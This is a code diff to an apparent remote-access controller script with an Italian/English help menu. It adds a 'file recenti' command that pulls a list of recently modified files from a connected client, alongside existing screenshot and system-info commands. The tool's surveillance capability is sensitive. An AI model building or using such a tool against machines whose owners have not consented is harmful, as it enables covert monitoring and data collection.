@@ -341,6 +341,19 @@ def remoteControl(clientConnection,buff,fileLog):
                     print("\nAn error occurred, try again\n")
                     fileLog = fileLog + "\n" + "An error occurred, try again...\n"
 
+            elif comando[0:12] == "file recenti":
+                try:
+                    dato = clientConnection.recv(10000).decode()
+                    if dato[0:7] == "[ERROR]":
+                        raise Exception
+                    else:
+                        print(dato)
+                        fileLog = fileLog + "\n" + dato +"\n"
+                except:
+                    #traceback.print_exc()
+                    print("\nAn error occurred, try again\n")
+                    fileLog = fileLog + "\n" + "An error occurred, try again...\n"
+
             elif comando == "screenshot":
                 nomeFoto = input("Name of the screen (without extension): ")
                 nomeFoto=nomeFoto+".png"
@@ -465,6 +478,7 @@ def commandsHelp():
     print(f"Ripulisci terminale:                        clear")
     print(f"Informazioni ifconfig/ipconfig:             rete/network")
     print(f"Informazioni S.O. client:                   info")
+    print(f"Lista file modificati di recente            file recenti")
     print(f"Aprire un file.zip:                         open <\"nomeFile.zip\">")
     print()
     print("Tipologie di path:")
